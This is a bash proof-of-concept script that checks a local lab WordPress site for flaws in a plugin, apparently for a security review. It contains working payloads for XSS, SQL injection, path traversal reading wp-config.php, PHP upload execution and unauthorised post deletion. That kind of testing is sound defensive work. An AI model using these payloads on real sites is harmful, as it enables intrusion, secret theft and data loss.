#!/bin/bash
# Local-only proof checks for the DEMO plugin. Targets 127.0.0.1:8099 only. Harmless probes.
export PATH=${LAB_BIN:-/workspace/venture/lab/bin}:$PATH
SITE=${SITE:-/workspace/venture/security-reviews/lab-site}
B=http://127.0.0.1:8099
W="wp --path=$SITE --quiet"
TMP=$(mktemp -d)
login() { curl -s -c $TMP/$1.jar -b "wordpress_test_cookie=WP%20Cookie%20check" -o /dev/null -d "log=$1&pwd=$2&wp-submit=Log+In&testcookie=1" $B/wp-login.php; }
login admin adminpass; login sub subpass; login contrib contribpass
res() { printf '%-4s %-46s %s\n' "$1" "$2" "$3"; }

# F1: contributor-authored shortcode attribute -> XSS on the published page
cat > $TMP/f1.php <<'PHP'
<?php
$u = get_user_by('login','contrib'); wp_set_current_user($u->ID); kses_init();
$id = wp_insert_post(array('post_title'=>'Contributor post','post_status'=>'pending','post_author'=>$u->ID,
 'post_content'=>"[dnb_board title='x\" onmouseover=\"alert(1)' limit=\"1\"]"));
wp_update_post(array('ID'=>$id,'post_status'=>'publish')); // an editor approves it
echo $id;
PHP
# publish as admin context after the kses-filtered insert
P1=$($W eval-file $TMP/f1.php 2>/dev/null)
$W post update $P1 --post_status=publish >/dev/null 2>&1
out=$(curl -s "$B/?p=$P1")
echo "$out" | grep -q 'onmouseover="alert(1)"' && res F1 "Shortcode attribute XSS (contributor)" "EXPLOITABLE" || res F1 "Shortcode attribute XSS (contributor)" "blocked"

# F2: unauthenticated REST create + stored XSS in author field
curl -s -X POST -H 'Content-Type: application/json' -d '{"title":"hello","author":"<script>alert(2)</script>"}' "$B/?rest_route=/dnb/v1/notes" > $TMP/f2.json
P2=$($W post create --post_type=page --post_status=publish --post_title=Board --post_content='[dnb_board]' --porcelain 2>/dev/null)
code=$(grep -c '"id"' $TMP/f2.json)
out=$(curl -s "$B/?page_id=$P2")
if [ "$code" = 1 ]; then r1="EXPLOITABLE"; else r1="blocked"; fi
echo "$out" | grep -q '<script>alert(2)</script>' && r2="EXPLOITABLE" || r2="blocked"
res F2a "REST create note, no login (permission_callback)" "$r1"
res F2b "Stored XSS via author field" "$r2"

# F3: SQL injection in the search endpoint
$W post create --post_type=dnb_note --post_status=private --post_title='PRIVATE-SECRET-NOTE' >/dev/null 2>&1
q=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"zzz%' OR post_status='private' OR post_title LIKE '\"))")
out=$(curl -s "$B/wp-admin/admin-ajax.php?action=dnb_search&q=$q")
echo "$out" | grep -q 'PRIVATE-SECRET-NOTE' && res F3 "SQL injection in search (no login)" "EXPLOITABLE" || res F3 "SQL injection in search (no login)" "blocked"

# F5: path traversal file read
out=$(curl -s --path-as-is "$B/?dnb_export=..%2f..%2f..%2f..%2fwp-config.php")
echo "$out" | grep -q 'DB_NAME' && res F5 "Path traversal reads wp-config.php (no login)" "EXPLOITABLE" || res F5 "Path traversal reads wp-config.php (no login)" "blocked"

# F6: subscriber uploads a PHP file
echo "<?php echo 'probe-ok';" > $TMP/probe.php
curl -s -b $TMP/sub.jar -F action=dnb_upload -F attachment=@$TMP/probe.php $B/wp-admin/admin-post.php -o /dev/null
out=$(curl -s $B/wp-content/uploads/dnb/probe.php)
[ "$out" = "probe-ok" ] && res F6 "Subscriber uploads and runs a PHP file" "EXPLOITABLE" || res F6 "Subscriber uploads and runs a PHP file" "blocked"

# F7: reflected XSS on the admin page (needs an admin to click)
out=$(curl -s -b $TMP/admin.jar "$B/wp-admin/admin.php?page=dnb-board&msg=%3Cscript%3Ealert(7)%3C/script%3E")
echo "$out" | grep -q '<script>alert(7)</script>' && res F7 "Reflected XSS on admin page" "EXPLOITABLE" || res F7 "Reflected XSS on admin page" "blocked"

# F4: subscriber deletes a post they do not own (run last, it deletes post 1)
before=$($W post list --post_type=post --format=count 2>/dev/null)
curl -s -b $TMP/sub.jar -d "action=dnb_delete_note&id=1" $B/wp-admin/admin-ajax.php -o /dev/null
exists=$($W post list --post_type=post --post__in=1 --format=count 2>/dev/null)
[ "$exists" = "0" ] && res F4 "Subscriber deletes any post (no nonce/cap)" "EXPLOITABLE" || res F4 "Subscriber deletes any post (no nonce/cap)" "blocked"
rm -rf $TMP
